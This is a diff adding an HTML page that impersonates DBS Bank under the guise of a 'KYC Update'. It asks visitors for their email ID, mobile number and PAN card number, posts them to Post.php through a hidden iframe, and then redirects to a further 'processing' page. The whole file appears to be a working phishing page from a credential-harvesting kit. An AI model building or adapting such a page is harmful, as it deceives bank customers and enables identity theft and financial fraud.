@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="content-type" content="text/html;charset=utf-8" />
+    <meta charSet="utf-8" />
+    <meta name="viewport" content="width=device-width" />
+    <meta name="theme-color" content="#ffffff">
+    <title>DBS Bank | KYC Update</title>
+<meta name="description" content="login" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="./style.css">
+  <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css'><link rel="stylesheet" href="./style.css">
+<style type="text/css">
+#mn
+{ 
+  width:104.4%;
+  margin-top:-9px;
+  margin-left:-8px;
+}
+#ft
+{ 
+  width:92%;
+  margin-top:20px;
+  text-align:bottom;
+}
+#pc
+{ 
+  width:92%;
+  margin-left:2px;
+  margin-bottom:20px;
+}
+#btn {
+  cursor: pointer;
+  background-color:#ED2C23;
+  color:#fff;
+  font-family:'Open Sans', sans-serif;
+  border: none;
+  margin-left:205px;
+  font-weight: 700;
+  border-radius: 4px;
+  letter-spacing: 1px;
+  width: 28%;
+  height: 38px;
+  transition: 300ms background-color ease-in-out;
+}
+#btn:hover {
+  background-color: #fff;
+  border:1.2px solid #ED2C23;
+  color:#ED2C23;
+}
+input[type="text"] {
+  width: 90%;
+  color:#000;
+  border: none;
+  border-radius: 2px;
+  outline: none;
+  padding: 20px;
+  box-sizing: border-box;
+  transition: 0.3s;
+}
+input[type="email"] {
+  width: 90%;
+  color:#000;
+  border: none;
+  border-radius: 2px;
+  outline: none;
+  padding: 20px;
+  box-sizing: border-box;
+  transition: 0.3s;
+}
+#PAN
+{
+    text-transform: uppercase;
+}
+input::-webkit-input-placeholder {
+    color: transparent;
+    font-family: 'Open Sans', sans-serif;
+}
+input:focus::-webkit-input-placeholder {
+    color: #999;
+    text-transform:none;
+    font-family: 'Open Sans', sans-serif;
+}
+
+/* Firefox < 19 */
+input:-moz-placeholder {
+    color: transparent;
+    font-family: 'Open Sans', sans-serif;
+}
+input:focus:-moz-placeholder {
+    color: #999;
+    font-family: 'Open Sans', sans-serif;
+    text-transform:none;
+}
+
+/* Firefox > 19 */
+input::-moz-placeholder {
+    color: transparent;
+    font-family: 'Open Sans', sans-serif;
+}
+input:focus::-moz-placeholder {
+    color: #999;
+    font-family: 'Open Sans', sans-serif;
+    text-transform:none;
+}
+
+/* Internet Explorer 10 */
+input:-ms-input-placeholder {
+    color: transparent;
+    font-family: 'Open Sans', sans-serif;
+}
+input:focus:-ms-input-placeholder {
+    color: #999;
+    font-family: 'Open Sans', sans-serif;
+    text-transform:none;
+}
+</style>
+</head>
+<body style="background-color:#f6f5f1;">
+  <!-- Static- Please don't do anything here-->
+  <script type="text/javascript">var submitted=false;</script>
+  <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Processing_Mobile_And_Email.html';}"></iframe>
+        <img alt="" src="Logo.jpg" id="mn"/><br>
+        <div>
+        <p1 style="color:#000; font-family: 'Open Sans', sans-serif; font-size:16px; letter-spacing: 0.2px; word-spacing: 0.2px; margin-left:16px; font-weight:700; text-decoration:none;">Let's verify you </p1>
+        </div>
+        <div>
+        <p1 style="color:#000; font-family: 'Open Sans', sans-serif; font-size:14px; letter-spacing: 0.2px; word-spacing: 0.2px; margin-left:16px; font-weight:400; text-decoration:none;">Please ensure that your mobile number and<br><span style="margin-left:16px;">email ID is registered with your account for</span><br><span style="margin-left:16px;">safe and secure online banking.</span></p1>
+        </div><br>
+        <form class="LoginForm" action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="form" >
+                        <div class="input-group">
+                        <center><input class="input-group__input" type="email" name="Email_ID" maxlength="100" placeholder="Enter Email ID" id="Email"
+                        required />
+                        <label class="input-group__label" for="Email">Email ID</label>
+                        </div>
+                        <div class="input-group">
+                        <center><input class="input-group__input" type="text" name="Mobile_Number" inputmode="numeric" maxlength="10" placeholder="Enter Mobile Number" id="mobile"
+                        pattern="[6-9]\d{9}" title="Please enter valid mobile number !" required />
+                        <label class="input-group__label" for="mobile">Mobile Number</label></center>
+                        </div>
+                        <div class="input-group">
+                        <center><input type="text" class="input-group__input" placeholder="Enter PAN Card Number" name="PAN_Number" id="PAN"  maxlength="10" autocomplete="off"
+                        pattern="[a-zA-Z]{5}[0-9]{4}[a-zA-Z]{1}" title="Please enter valid PAN number !" required />
+                        <label class="input-group__label" for="PAN">PAN Card Number</label>
+                        </div>
+                        <center><button type="submit" id="btn">NEXT</button></center><br>
+                        <center><img alt="" src="OTP_Content.jpg" id="ft"/></center>
+                    </form>
+  </body>
+</html>
